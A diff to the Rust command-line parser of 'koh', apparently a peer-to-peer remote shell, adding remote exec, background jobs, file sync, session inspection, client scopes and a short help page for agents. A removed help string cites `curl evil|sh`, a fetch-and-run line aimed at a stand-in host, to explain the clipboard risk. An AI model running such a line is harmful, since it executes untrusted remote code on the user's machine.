@@ -7,22 +7,30 @@
 //! invalid one never gets past the command line.
 
 use std::error::Error as _;
+use std::ffi::OsString;
 use std::net::SocketAddr;
 use std::num::NonZeroU32;
+use std::os::unix::ffi::OsStrExt as _;
 use std::path::PathBuf;
 
 use clap::error::ErrorKind;
 use clap::{value_parser, Arg, ArgAction, ArgMatches, Command};
 use iroh::{EndpointId, RelayUrl};
 
-use koh::client::ConnectConfig;
+use koh::client::{ConnectConfig, CopyJob, Remote};
 use koh::keycmd::{KeyConfig, KeyOp};
-use koh::names::{List, Op};
+use koh::names::{List, Op, Route, Scope};
+use koh::request::{
+    Argv, Command as Cmdline, CommandLine, JobName, On, Pick, RemotePath, Run, SessionNum, Signal,
+    Sources, Until, Wait, WaitText,
+};
 use koh::server::cli::{
-    DEFAULT_MAX_CONNECTIONS, DEFAULT_MAX_SESSIONS, DEFAULT_SCROLLBACK, DEFAULT_SESSION_TTL_SECS,
-    MAX_SCROLLBACK,
+    DEFAULT_JOB_LOG_BYTES, DEFAULT_MAX_CONNECTIONS, DEFAULT_MAX_SESSIONS, DEFAULT_SCROLLBACK_BYTES,
+    DEFAULT_SESSION_TTL_SECS, MAX_JOB_LOG_BYTES, MAX_SCROLLBACK_BYTES,
 };
 use koh::server::ServeConfig;
+use koh::sync::glob::{Excludes, Pattern};
+use koh::sync::Opts;
 use koh::transport_iroh::{parse_endpoint_id, parse_relay_url};
 
 /// A value clap could not parse, with the message koh reports for it (see [`bad_value`]).
@@ -86,6 +94,59 @@ fn relay_url(value: &str) -> Result<RelayUrl, BadValue> {
 pub enum Cmd {
     Serve(ServeConfig),
     Connect(ConnectArgs),
+    /// `koh sessions`.
+    Sessions(RemoteArgs, bool),
+    /// `koh output`.
+    Output {
+        remote: RemoteArgs,
+        session: SessionNum,
+        last: bool,
+        json: bool,
+    },
+    /// `koh exec`.
+    Exec {
+        remote: RemoteArgs,
+        run: Run,
+        json: bool,
+    },
+    /// `koh run`.
+    Start {
+        remote: RemoteArgs,
+        name: Option<JobName>,
+        run: Run,
+        json: bool,
+    },
+    /// `koh jobs`.
+    Jobs(RemoteArgs, bool),
+    /// `koh logs`.
+    Logs {
+        remote: RemoteArgs,
+        job: JobName,
+        follow: bool,
+    },
+    /// `koh kill`.
+    Kill {
+        remote: RemoteArgs,
+        job: JobName,
+        signal: Signal,
+        json: bool,
+    },
+    /// `koh wait`.
+    Wait {
+        remote: RemoteArgs,
+        wait: Wait,
+        timeout: Option<std::time::Duration>,
+        json: bool,
+    },
+    /// `koh cp`.
+    Copy {
+        remote: RemoteArgs,
+        job: CopyJob,
+        opts: Opts,
+        /// The destination as the user wrote it, to say.
+        shown: String,
+        json: bool,
+    },
     Key(KeyConfig),
     /// `koh servers` or `koh clients`.
     Names {
@@ -93,17 +154,43 @@ pub enum Cmd {
         op: Op,
         key_file: Option<PathBuf>,
     },
+    /// `koh help-agents`.
+    HelpAgents,
     /// `koh` alone: the menu on a terminal, else help.
     Menu,
+}
+
+/// The server a command dials and how: a [`Remote`] once its server is known.
+#[derive(Debug, Clone)]
+pub struct RemoteArgs {
+    pub server: ServerRef,
+    pub key_file: Option<PathBuf>,
+    pub direct: Option<SocketAddr>,
+    pub relay_url: Option<RelayUrl>,
+}
+
+impl RemoteArgs {
+    /// `server`, as these say to dial it, else by its `saved` route.
+    pub fn into_remote(self, server: EndpointId, saved: Option<Route>) -> Remote {
+        let (direct, relay_url) = match (self.direct, self.relay_url, saved) {
+            (None, None, Some(Route::Direct(addr))) => (Some(addr), None),
+            (None, None, Some(Route::Relay(url))) => (None, Some(url)),
+            (direct, relay_url, _) => (direct, relay_url),
+        };
+        Remote {
+            server,
+            key_file: self.key_file,
+            direct,
+            relay_url,
+        }
+    }
 }
 
 /// `koh connect`'s arguments: a [`ConnectConfig`] once its server is known.
 #[derive(Debug, Clone)]
 pub struct ConnectArgs {
-    pub server: ServerRef,
-    pub key_file: Option<PathBuf>,
-    pub direct: Option<SocketAddr>,
-    pub relay_url: Option<RelayUrl>,
+    pub remote: RemoteArgs,
+    pub pick: Pick,
     pub clipboard: bool,
     pub hyperlinks: bool,
     pub colours: bool,
@@ -111,13 +198,11 @@ pub struct ConnectArgs {
 }
 
 impl ConnectArgs {
-    /// The config for dialing `server`.
-    pub fn into_config(self, server: EndpointId) -> ConnectConfig {
+    /// The config for dialing `server`, by its `saved` route unless told another.
+    pub fn into_config(self, server: EndpointId, saved: Option<Route>) -> ConnectConfig {
         ConnectConfig {
-            server,
-            key_file: self.key_file,
-            direct: self.direct,
-            relay_url: self.relay_url,
+            remote: self.remote.into_remote(server, saved),
+            pick: self.pick,
             clipboard: self.clipboard,
             hyperlinks: self.hyperlinks,
             colours: self.colours,
@@ -126,17 +211,68 @@ impl ConnectArgs {
     }
 }
 
+/// What `koh help-agents` prints: everything an agent needs, short.
+pub const HELP_AGENTS: &str = "\
+koh for scripts and agents. SERVER is a name saved with `koh servers add NAME ID --direct IP:PORT`
+or an endpoint id. Nothing here needs a terminal but `connect`.
+
+Run something:
+  koh exec SERVER -- PROG ARG...       words passed as they are, no shell; ~/x is in the home
+  koh exec SERVER --sh 'cd src && make'  a shell line, on purpose
+  koh exec SERVER -C DIR -- PROG ...   start in DIR (relative: in the home)
+  stdin goes to the command; stdout and stderr come back apart; exits with its status
+  (127 no such program, 255 koh's own error). A killed koh hangs it up within 20 s.
+
+Jobs (survive koh exiting and the link dropping; output and status kept):
+  koh run SERVER [--name build] -- make -j4   prints the job's name
+  koh wait SERVER build                 until it ends; exits with its status
+  koh wait SERVER build --text listening  until its output has the text (1 if it ended first)
+  koh wait SERVER --file out/done.txt   until the file exists
+  koh logs SERVER build [--follow]      its output (with --follow until it ends, then its status)
+  koh jobs SERVER   koh kill SERVER build [--signal KILL]
+
+Copy (a sync: merges, makes parents, sends only files that changed, by hash):
+  koh cp -r ./src SERVER:proj/          src lands as proj/src; `./src/.` lands its contents
+  koh cp SERVER:proj/out.txt .          the other way
+  --delete removes what the source lacks; --exclude PAT (repeat); -p keeps mtimes (default:
+  arrival time, so builds see changes); --atomic lands nothing until all came. Prints one line:
+  `3 files, 41 KB → SERVER:proj/ (2 replaced, 120 unchanged)`. A cut copy resumes when rerun.
+
+Shell sessions (`koh connect SERVER` in a terminal, or fux):
+  koh sessions SERVER                   number, attached, state (reading/busy/...), last status
+  koh wait SERVER --session N           until its running command ends; exits with its status
+  koh wait SERVER --session N --reading until its program waits for input
+  koh output SERVER --session N [--last]  its screen, or the last command's output
+
+--json on sessions, output, exec, run, jobs, kill, wait and cp: one JSON value on stdout, and on
+failure {\"error\":{\"kind\":...,\"message\":...}}. --timeout SECS on wait (exit 124).
+Exit codes: 0 ok, 1 failed, 2 usage, 3 server not reached, 4 refused (not allowed, or out of
+the key's scope), 124 wait timed out; exec, wait and logs --follow exit with the remote status.
+";
+
 /// `koh`'s command line.
 pub fn command() -> Command {
     Command::new("koh")
         .version(env!("CARGO_PKG_VERSION"))
-        .about("koh — a resilient peer-to-peer remote shell (mosh over iroh). Run alone on a terminal, it opens a menu of your keys, servers and clients")
+        .about("koh: a peer-to-peer remote shell over iroh. Alone on a terminal it opens a menu of your keys, servers and clients. Agents: `koh help-agents`")
         .subcommand(serve())
         .subcommand(connect())
+        .subcommand(sessions())
+        .subcommand(output())
+        .subcommand(exec())
+        .subcommand(run())
+        .subcommand(jobs())
+        .subcommand(logs())
+        .subcommand(kill())
+        .subcommand(wait())
+        .subcommand(cp())
         .subcommand(id())
         .subcommand(key())
         .subcommand(names(List::Servers))
         .subcommand(names(List::Clients))
+        .subcommand(Command::new("help-agents").about("What scripts and agents need of koh, in one short page"))
+        // `--help` ends with that page, so a script's first look has all it needs.
+        .after_long_help(HELP_AGENTS)
 }
 
 /// An optional path, `--NAME <VALUE_NAME>`.
@@ -152,137 +288,257 @@ fn flag(id: &'static str, long: &'static str) -> Arg {
     Arg::new(id).long(long).action(ArgAction::SetTrue)
 }
 
+/// `--json`.
+fn json() -> Arg {
+    flag("json", "json").help("Say it as one JSON value on stdout")
+}
+
 fn serve() -> Command {
     Command::new("serve")
-        .about("Host a PTY shell for authorized clients")
-        .arg(
-            path("key_file", "key-file", "KEY_FILE")
-                .help("Path to the persistent secret-key file (gives a stable endpoint id across restarts)"),
-        )
+        .about("Host shells, commands, jobs and copies for the allowed clients")
+        .arg(path("key_file", "key-file", "KEY_FILE").help("The server's secret-key file (a stable endpoint id)"))
         .arg(
             Arg::new("allow")
                 .long("allow")
                 .value_name("ENDPOINT_ID")
                 .value_parser(allow_id)
                 .action(ArgAction::Append)
-                .help("Authorize a client endpoint id (repeatable), for this run, beside the clients saved with `koh clients add`. At least one client is required — koh only serves peers whose node-id is allowed"),
+                .help("Allow a client endpoint id for this run (repeatable), beside those saved with `koh clients add`"),
         )
         .arg(
             Arg::new("shell")
                 .long("shell")
                 .value_name("PROGRAM_OR_ARG")
                 .action(ArgAction::Append)
-                .help("Program to run in the session (defaults to $SHELL, else /bin/sh, started as a plain shell, not a login one). Repeat to pass arguments: `--shell zellij --shell attach --shell -c --shell main` runs `zellij attach -c main`. The value is never split on whitespace"),
+                .help("The program a session runs (default $SHELL); repeat to pass arguments; never split on whitespace"),
+        )
+        .arg(flag("no_shell_marks", "no-shell-marks").help("Start bash, zsh or fish without koh's marks (OSC 133) of where each command starts and ends"))
+        .arg(
+            Arg::new("scrollback_bytes")
+                .long("scrollback-bytes")
+                .value_name("BYTES")
+                .default_value(DEFAULT_SCROLLBACK_BYTES.to_string())
+                .value_parser(value_parser!(u64).range(0..=MAX_SCROLLBACK_BYTES))
+                .help("History each session keeps (at most 1 GiB)"),
         )
         .arg(
-            Arg::new("scrollback")
-                .long("scrollback")
-                .value_name("SCROLLBACK")
-                .default_value(DEFAULT_SCROLLBACK.to_string())
-                .value_parser(value_parser!(u64).range(0..=MAX_SCROLLBACK))
-                .help("Scrollback lines retained by the server-side emulator (per session). Bounded like the other resource knobs (`--max-connections`/`--max-sessions`) and by the emulator's per-buffer cell limit at the largest screen. 0 = no scrollback"),
+            Arg::new("job_log_bytes")
+                .long("job-log-bytes")
+                .value_name("BYTES")
+                .default_value(DEFAULT_JOB_LOG_BYTES.to_string())
+                .value_parser(value_parser!(u64).range(0..=MAX_JOB_LOG_BYTES))
+                .help("Output each job keeps, its newest (at most 64 MiB)"),
         )
         .arg(
             Arg::new("session_ttl_secs")
                 .long("session-ttl-secs")
-                .value_name("SESSION_TTL_SECS")
+                .value_name("SECS")
                 .default_value(DEFAULT_SESSION_TTL_SECS.to_string())
                 .value_parser(value_parser!(u64))
-                .help("Keep a detached session's shell alive this long (seconds) for the client to reconnect. Default 24h (mosh-style \"close the laptop, reopen later\")"),
+                .help("How long a detached session, or an ended job, is kept"),
         )
-        .arg(
-            Arg::new("relay_url")
-                .long("relay-url")
-                .value_name("URL")
-                .value_parser(relay_url)
-                .help("Host via a self-hosted relay URL instead of n0's public relays"),
-        )
-        .arg(
-            flag("local", "local")
-                .conflicts_with("relay_url")
-                .help("Bind without any relay/discovery (LAN / loopback). Clients dial with --direct <ip:port>"),
-        )
+        .arg(Arg::new("relay_url").long("relay-url").value_name("URL").value_parser(relay_url).help("Use this self-hosted relay instead of n0's"))
+        .arg(flag("local", "local").conflicts_with("relay_url").help("No relay or discovery (LAN, loopback): clients dial --direct IP:PORT"))
         .arg(
             Arg::new("port")
                 .long("port")
                 .value_name("PORT")
                 .value_parser(value_parser!(u16).range(1..))
-                .help("Bind this UDP port (IPv4 and IPv6) instead of an ephemeral one, so clients dialing --direct <ip:port> find the server again after a restart"),
+                .help("Bind this UDP port, so --direct clients find a restarted server"),
         )
         .arg(
             Arg::new("max_connections")
                 .long("max-connections")
-                .value_name("MAX_CONNECTIONS")
+                .value_name("N")
                 .default_value(DEFAULT_MAX_CONNECTIONS.to_string())
                 .value_parser(value_parser!(NonZeroU32))
-                .help("Maximum number of connections handled at once (each holds a permit for its whole life; past them a new one is closed as at capacity once its handshake is done). Handshakes under way are capped apart, so stalled ones never take these"),
+                .help("Most connections at once"),
         )
         .arg(
             Arg::new("max_sessions")
                 .long("max-sessions")
-                .value_name("MAX_SESSIONS")
+                .value_name("N")
                 .default_value(DEFAULT_MAX_SESSIONS.to_string())
                 .value_parser(value_parser!(NonZeroU32))
-                .help("Maximum number of distinct live sessions (one per authorized peer). A new peer is refused once this many sessions exist; reconnecting to an existing session is always allowed. Bounds the number of real shells a flood of authorized keys can spawn"),
+                .help("Most sessions, all clients' together"),
         )
 }
 
-fn connect() -> Command {
-    Command::new("connect")
-        .about("Connect to a koh server by its name or endpoint id")
-        .arg(
-            Arg::new("server")
-                .value_name("SERVER")
-                .value_parser(server_ref)
-                .required(true)
-                .help("The server: a name saved with `koh servers add`, or its endpoint id"),
-        )
-        .arg(
-            path("key_file", "key-file", "KEY_FILE")
-                .help("Path to the client's persistent secret key (its endpoint id must be on the server's allowlist)"),
-        )
+/// `cmd` with how to dial the server: the client key, `--direct` and `--relay-url`.
+fn dialing(cmd: Command) -> Command {
+    cmd.arg(path("key_file", "key-file", "KEY_FILE").help("The client's secret-key file"))
         .arg(
             Arg::new("direct")
                 .long("direct")
                 .value_name("IP:PORT")
                 .value_parser(value_parser!(SocketAddr))
                 .conflicts_with("relay_url")
-                .help("Dial the server at a direct socket address (LAN / loopback; no relay or discovery)"),
+                .help("Dial this address (LAN, loopback; no relay or discovery)"),
         )
         .arg(
             Arg::new("relay_url")
                 .long("relay-url")
                 .value_name("URL")
                 .value_parser(relay_url)
-                .help("Dial the server via a self-hosted relay URL instead of n0's public relays"),
+                .help("Dial via this self-hosted relay"),
         )
+}
+
+/// `cmd` with its server, `SERVER`, and how to dial it.
+fn remote(cmd: Command) -> Command {
+    dialing(
+        cmd.arg(
+            Arg::new("server")
+                .value_name("SERVER")
+                .value_parser(server_ref)
+                .required(true)
+                .help("A name saved with `koh servers add`, or an endpoint id"),
+        ),
+    )
+}
+
+/// `--session N`.
+fn session(required: bool) -> Arg {
+    Arg::new("session")
+        .long("session")
+        .value_name("N")
+        .value_parser(value_parser!(u64))
+        .required(required)
+        .help("Your session numbered N (`koh sessions`)")
+}
+
+fn connect() -> Command {
+    remote(Command::new("connect").about("Open a shell on a server, in this terminal: your session there attached last, else a new one. Ctrl-^ . detaches, Ctrl-^ Ctrl-Z suspends"))
+        .arg(flag("new", "new").conflicts_with("session").help("A new session, beside your others"))
+        .arg(session(false))
+        .arg(flag("no_clipboard", "no-clipboard").help("Do not let the server set your clipboard (OSC 52)"))
+        .arg(flag("no_hyperlinks", "no-hyperlinks").help("Do not pass the server's links (OSC 8) to your terminal"))
+        .arg(flag("no_colours", "no-colours").help("Do not tell the server your terminal's colours (programs asking get no answer)"))
+        .arg(Arg::new("on_bell").long("on-bell").value_name("CMD").help("Run this shell command when the remote bell rings (at most once a second; KOH_BELL_COUNT, KOH_TITLE set)"))
+}
+
+fn sessions() -> Command {
+    remote(Command::new("sessions").about("List your sessions: number, attached or detached, age, size, what its program is doing (reading, busy, ...; running: while a command runs), the last command's status, title"))
+        .arg(json())
+}
+
+fn output() -> Command {
+    remote(Command::new("output").about(
+        "Print a session's screen as text, or the output of the last command its shell finished",
+    ))
+    .arg(session(true))
+    .arg(flag("last", "last").help("The last finished command's output, not the screen"))
+    .arg(json())
+}
+
+/// What `exec` and `run` take: the command and where it starts.
+fn command_args(cmd: Command) -> Command {
+    cmd.arg(
+        Arg::new("sh")
+            .long("sh")
+            .value_name("LINE")
+            .conflicts_with("command")
+            .required_unless_present("command")
+            .help("Run LINE with the server user's shell ($SHELL -c)"),
+    )
+    .arg(
+        Arg::new("cwd")
+            .short('C')
+            .long("cd")
+            .value_name("DIR")
+            .value_parser(value_parser!(OsString))
+            .help("Start in DIR (relative: in the server user's home)"),
+    )
+    .arg(
+        Arg::new("command")
+            .value_name("PROG")
+            .value_parser(value_parser!(OsString))
+            .num_args(1..)
+            .last(true)
+            .help("After `--`: the program and its arguments, passed as they are"),
+    )
+    .arg(json())
+}
+
+fn exec() -> Command {
+    command_args(remote(Command::new("exec").about("Run a command on a server with no terminal and exit with its status: your stdin goes to it, its stdout and stderr come back apart. A killed or dropped koh hangs it up (within 20 s if killed). 127: no such program; 255: koh's own error")))
+}
+
+fn run() -> Command {
+    command_args(remote(Command::new("run").about("Start a job: a command that outlives this koh and the link, its stdout and stderr kept together (`koh logs`), its status too (`koh wait`, `koh jobs`). Prints its name")))
+        .arg(Arg::new("name").long("name").value_name("NAME").value_parser(job_name).help("Its name (default: the next free number); one that ended is replaced"))
+}
+
+fn jobs() -> Command {
+    remote(Command::new("jobs").about(
+        "List your jobs: name, running or exited (status, how long it ran), output size, command",
+    ))
+    .arg(json())
+}
+
+/// A job's name, the argument.
+fn job_arg(required: bool) -> Arg {
+    Arg::new("job")
+        .value_name("JOB")
+        .value_parser(job_name)
+        .required(required)
+        .help("The job's name")
+}
+
+fn logs() -> Command {
+    remote(Command::new("logs").about("Print a job's output (the newest `--job-log-bytes` kept); with --follow, until it ends, then exit with its status"))
+        .arg(job_arg(true))
+        .arg(flag("follow", "follow").short('f').help("Go on until the job ends"))
+}
+
+fn kill() -> Command {
+    remote(Command::new("kill").about("Send a job's processes a signal (TERM by default)"))
+        .arg(job_arg(true))
         .arg(
-            flag("no_clipboard", "no-clipboard")
-                .help("Ignore the remote app's OSC-52 clipboard writes. By default they set your system clipboard (base64 only, at most 16 KiB, never read back), so a remote app's \"copy\" works; but a malicious or compromised server can then replace what you copied (a command for `curl evil|sh`, say). Use this when you do not trust the server"),
+            Arg::new("signal")
+                .long("signal")
+                .short('s')
+                .value_name("SIG")
+                .default_value("TERM")
+                .value_parser(signal)
+                .help("TERM, KILL, INT or HUP"),
         )
+        .arg(json())
+}
+
+fn wait() -> Command {
+    remote(Command::new("wait").about("Wait on the server: for a job to end (exit with its status), or a text in its output, or a file; for a session's running command to end (at once if none runs), its program to read its terminal, or a text on its screen"))
+        .arg(job_arg(false).conflicts_with("session"))
+        .arg(session(false))
+        .arg(Arg::new("text").long("text").value_name("TEXT").conflicts_with_all(["file", "reading"]).help("Until the text appears (exit 1 if the job ends first)"))
+        .arg(Arg::new("file").long("file").value_name("PATH").value_parser(value_parser!(OsString)).conflicts_with("reading").help("Until the path exists (relative: in the home)"))
+        .arg(flag("reading", "reading").requires("session").help("Until the session's program waits for input"))
+        .arg(Arg::new("timeout").long("timeout").value_name("SECS").value_parser(value_parser!(f64)).help("Give up after SECS: exit 124"))
+        .arg(json())
+}
+
+fn cp() -> Command {
+    dialing(Command::new("cp").about("Copy files and trees between here and a server, as a sync: `koh cp SRC... SERVER:DST` or `koh cp SERVER:SRC... DST`. Into DST if it is a directory (or ends in /, or there are several SRC: it is made), else as DST, its parents made. Directories merge; only files that changed are sent (by hash); a cut copy resumes when run again. A file written gets its arrival time unless -p. `dir/.` copies what is in dir. Prints what it did"))
         .arg(
-            flag("no_hyperlinks", "no-hyperlinks")
-                .help("Paint the remote app's hyperlinks (OSC 8) as plain text. By default they are painted as links your terminal can open, each checked first: printable ASCII only, within fux-vt's limits"),
+            Arg::new("paths")
+                .value_name("PATH")
+                .value_parser(value_parser!(OsString))
+                .num_args(2..)
+                .required(true)
+                .help("The sources, then the destination; one side is SERVER:PATH (a path with a / before its : is local)"),
         )
-        .arg(
-            flag("no_colours", "no-colours")
-                .help("Do not tell the server your terminal's colours. By default koh asks your terminal its foreground, background, palette entries 0 to 15 and dark or light scheme, and the server answers remote programs that ask (vim, bat, delta pick their theme so); that tells the server your theme, a small fingerprint"),
-        )
-        .arg(
-            Arg::new("on_bell")
-                .long("on-bell")
-                .value_name("CMD")
-                .help("Run this shell command whenever the remote bell rings (e.g. on Termux: `--on-bell 'termux-notification -t \"koh bell\"'`). Detached from the terminal; at most one spawn per second. KOH_BELL_COUNT and KOH_TITLE are set in its environment. Bells that rang before you attached do not fire it; bells during a reconnect do"),
-        )
+        .arg(flag("recursive", "recursive").short('r').visible_short_alias('R').help("Accepted, as scp's: directories always copy whole"))
+        .arg(flag("preserve", "preserve").short('p').help("Keep the source's modification times"))
+        .arg(flag("delete", "delete").help("Remove from the destination's directories what the source does not have"))
+        .arg(flag("atomic", "atomic").help("Rename nothing into place, and remove nothing, until all of the copy came"))
+        .arg(Arg::new("exclude").long("exclude").value_name("PATTERN").action(ArgAction::Append).value_parser(value_parser!(OsString)).help("Neither send nor remove entries matching it: `*.o`, `target`, `src/gen/*` (repeatable)"))
+        .arg(json())
 }
 
 fn id() -> Command {
     Command::new("id")
         .about("Print this machine's koh id (add it to a server's --allow list)")
-        .arg(
-            path("key_file", "key-file", "KEY_FILE")
-                .help("Path to the client's persistent secret key"),
-        )
+        .arg(path("key_file", "key-file", "KEY_FILE").help("The client's secret-key file"))
 }
 
 fn key() -> Command {
@@ -331,6 +587,36 @@ fn names(list: List) -> Command {
             "server",
         ),
     };
+    let mut add = Command::new("add")
+        .about(format!("Save a {} under a name", list.noun()))
+        .arg(name_arg("name", "NAME"))
+        .arg(
+            Arg::new("id")
+                .value_name("ENDPOINT_ID")
+                .value_parser(saved_id)
+                .required(true),
+        );
+    add = match list {
+        List::Servers => add
+            .arg(
+                Arg::new("direct")
+                    .long("direct")
+                    .value_name("IP:PORT")
+                    .value_parser(value_parser!(SocketAddr))
+                    .conflicts_with("relay_url")
+                    .help("Dial it at this address unless a command says --direct or --relay-url itself"),
+            )
+            .arg(
+                Arg::new("relay_url")
+                    .long("relay-url")
+                    .value_name("URL")
+                    .value_parser(relay_url)
+                    .help("Dial it via this self-hosted relay unless a command says otherwise"),
+            ),
+        List::Clients => add
+            .arg(Arg::new("cp").long("cp").value_name("DIR").value_parser(scope_dir).help("Scope it: copies only, in DIR and below (no shell; with --exec, commands too)"))
+            .arg(Arg::new("exec").long("exec").value_name("DIR").value_parser(scope_dir).help("Scope it: commands and jobs only, started in DIR (no shell; not a sandbox: a command can reach what the server user can)")),
+    };
     Command::new(list.file())
         .about(about)
         .arg(
@@ -341,17 +627,7 @@ fn names(list: List) -> Command {
                     "The {key} key whose directory holds the list (defaults to the {key} key path)"
                 )),
         )
-        .subcommand(
-            Command::new("add")
-                .about(format!("Save a {} under a name", list.noun()))
-                .arg(name_arg("name", "NAME"))
-                .arg(
-                    Arg::new("id")
-                        .value_name("ENDPOINT_ID")
-                        .value_parser(saved_id)
-                        .required(true),
-                ),
-        )
+        .subcommand(add)
         .subcommand(
             Command::new("rm")
                 .about(format!("Forget a {}", list.noun()))
@@ -373,9 +649,57 @@ fn name_arg(id: &'static str, value_name: &'static str) -> Arg {
         .required(true)
 }
 
+/// A job's name.
+fn job_name(value: &str) -> Result<JobName, BadValue> {
+    JobName::new(value).map_err(|e| BadValue(e.to_owned()))
+}
+
+/// A signal's name.
+fn signal(value: &str) -> Result<Signal, BadValue> {
+    Signal::named(value).ok_or_else(|| BadValue(format!("{value:?} is not TERM, KILL, INT or HUP")))
+}
+
+/// A scope's directory.
+fn scope_dir(value: &str) -> Result<PathBuf, BadValue> {
+    Scope::dir(value).map_err(|e| BadValue(format!("{e:#}")))
+}
+
+/// The command `m` names (its words, or `--sh`) and where it starts.
+fn run_of(m: &ArgMatches) -> Result<Run, clap::Error> {
+    let command = if let Some(line) = m.get_one::<String>("sh") {
+        Cmdline::Shell(
+            CommandLine::new(line.clone().into_bytes())
+                .map_err(|why| invalid(&format!("--sh: {why}")))?,
+        )
+    } else {
+        {
+            let words: Vec<Vec<u8>> = m
+                .get_many::<OsString>("command")
+                .into_iter()
+                .flatten()
+                .map(|word| word.as_bytes().to_vec())
+                .collect();
+            Cmdline::Argv(Argv::new(words).map_err(|why| invalid(&format!("the command: {why}")))?)
+        }
+    };
+    let cwd = m
+        .get_one::<OsString>("cwd")
+        .map(|dir| RemotePath::new(dir.as_bytes().to_vec()))
+        .transpose()
+        .map_err(|why| invalid(&format!("--cd: {why}")))?;
+    Ok(Run { command, cwd })
+}
+
 /// The config `matches` asks for. clap has already enforced the required subcommands and
 /// arguments, the defaults and the ranges, so a missing value is an internal error.
 pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
+    let json = |m: &ArgMatches| {
+        m.try_get_one::<bool>("json")
+            .ok()
+            .flatten()
+            .copied()
+            .unwrap_or(false)
+    };
     match matches.subcommand() {
         Some(("serve", m)) => Ok(Cmd::Serve(ServeConfig {
             key_file: m.get_one::<PathBuf>("key_file").cloned(),
@@ -384,28 +708,136 @@ pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
                 .map_or_else(Vec::new, |ids| ids.copied().collect()),
             saved_clients: None,
             command: strings(m, "shell"),
-            scrollback: value(m, "scrollback")?,
+            scrollback_bytes: value(m, "scrollback_bytes")?,
             session_ttl_secs: value(m, "session_ttl_secs")?,
             relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
             local: m.get_flag("local"),
             port: m.get_one::<u16>("port").copied(),
             max_connections: value(m, "max_connections")?,
             max_sessions: value(m, "max_sessions")?,
-            launcher: koh::pty::Launcher::this_binary(),
+            home: koh::pty::Home::user(),
+            shell_marks: !m.get_flag("no_shell_marks"),
+            job_log_bytes: value(m, "job_log_bytes")?,
         })),
         Some(("connect", m)) => Ok(Cmd::Connect(ConnectArgs {
-            server: m
-                .get_one::<ServerRef>("server")
-                .cloned()
-                .ok_or_else(|| missing("server"))?,
-            key_file: m.get_one::<PathBuf>("key_file").cloned(),
-            direct: m.get_one::<SocketAddr>("direct").copied(),
-            relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
+            remote: remote_args(m)?,
+            pick: match m.get_one::<u64>("session") {
+                Some(&n) => Pick::Id(SessionNum(n)),
+                None if m.get_flag("new") => Pick::New,
+                None => Pick::Latest,
+            },
             clipboard: !m.get_flag("no_clipboard"),
             hyperlinks: !m.get_flag("no_hyperlinks"),
             colours: !m.get_flag("no_colours"),
             bell_command: m.get_one::<String>("on_bell").cloned(),
         })),
+        Some(("sessions", m)) => Ok(Cmd::Sessions(remote_args(m)?, json(m))),
+        Some(("output", m)) => Ok(Cmd::Output {
+            remote: remote_args(m)?,
+            session: SessionNum(value(m, "session")?),
+            last: m.get_flag("last"),
+            json: json(m),
+        }),
+        Some(("exec", m)) => Ok(Cmd::Exec {
+            remote: remote_args(m)?,
+            run: run_of(m)?,
+            json: json(m),
+        }),
+        Some(("run", m)) => Ok(Cmd::Start {
+            remote: remote_args(m)?,
+            name: m.get_one::<JobName>("name").cloned(),
+            run: run_of(m)?,
+            json: json(m),
+        }),
+        Some(("jobs", m)) => Ok(Cmd::Jobs(remote_args(m)?, json(m))),
+        Some(("logs", m)) => Ok(Cmd::Logs {
+            remote: remote_args(m)?,
+            job: value(m, "job")?,
+            follow: m.get_flag("follow"),
+        }),
+        Some(("kill", m)) => Ok(Cmd::Kill {
+            remote: remote_args(m)?,
+            job: value(m, "job")?,
+            signal: value(m, "signal")?,
+            json: json(m),
+        }),
+        Some(("wait", m)) => {
+            let on = match (m.get_one::<JobName>("job"), m.get_one::<u64>("session")) {
+                (Some(job), _) => Some(On::Job(job.clone())),
+                (None, Some(&n)) => Some(On::Session(SessionNum(n))),
+                (None, None) => None,
+            };
+            let until = if let Some(text) = m.get_one::<String>("text") {
+                Until::Text(
+                    WaitText::new(text.clone())
+                        .map_err(|why| invalid(&format!("--text: {why}")))?,
+                )
+            } else if let Some(file) = m.get_one::<OsString>("file") {
+                Until::File(
+                    RemotePath::new(file.as_bytes().to_vec())
+                        .map_err(|why| invalid(&format!("--file: {why}")))?,
+                )
+            } else if m.get_flag("reading") {
+                Until::Reading
+            } else {
+                Until::End
+            };
+            let wait = Wait::new(on, until).map_err(|why| {
+                invalid(&format!(
+                    "wait for what: {why} (name a JOB, --session N or --file PATH)"
+                ))
+            })?;
+            let timeout = m
+                .get_one::<f64>("timeout")
+                .map(|&secs| std::time::Duration::try_from_secs_f64(secs))
+                .transpose()
+                .map_err(|e| invalid(&format!("--timeout: {e}")))?;
+            Ok(Cmd::Wait {
+                remote: remote_args(m)?,
+                wait,
+                timeout,
+                json: json(m),
+            })
+        }
+        Some(("cp", m)) => {
+            let paths: Vec<&OsString> = m
+                .get_many::<OsString>("paths")
+                .into_iter()
+                .flatten()
+                .collect();
+            let (server, job) = copy_job(&paths)?;
+            let excludes = m
+                .get_many::<OsString>("exclude")
+                .into_iter()
+                .flatten()
+                .map(|p| Pattern::new(p.as_bytes().to_vec()))
+                .collect::<Result<Vec<_>, _>>()
+                .and_then(Excludes::new)
+                .map_err(|why| invalid(&format!("--exclude: {why}")))?;
+            let opts = Opts {
+                keep_times: m.get_flag("preserve"),
+                delete: m.get_flag("delete"),
+                atomic: m.get_flag("atomic"),
+                excludes,
+            };
+            let shown = paths
+                .last()
+                .map(|p| p.to_string_lossy().into_owned())
+                .unwrap_or_default();
+            Ok(Cmd::Copy {
+                remote: RemoteArgs {
+                    server,
+                    key_file: m.get_one::<PathBuf>("key_file").cloned(),
+                    direct: m.get_one::<SocketAddr>("direct").copied(),
+                    relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
+                },
+                job,
+                opts,
+                shown,
+                json: json(m),
+            })
+        }
+        Some(("help-agents", _)) => Ok(Cmd::HelpAgents),
         Some(("id", m)) => Ok(Cmd::Key(KeyConfig {
             op: KeyOp::Id,
             role: "client",
@@ -457,6 +889,11 @@ pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
                             .get_one::<EndpointId>("id")
                             .copied()
                             .ok_or_else(|| missing("id"))?,
+                        route: saved_route(sub),
+                        scope: Scope {
+                            cp: sub.try_get_one::<PathBuf>("cp").ok().flatten().cloned(),
+                            exec: sub.try_get_one::<PathBuf>("exec").ok().flatten().cloned(),
+                        },
                     },
                     sub,
                 ),
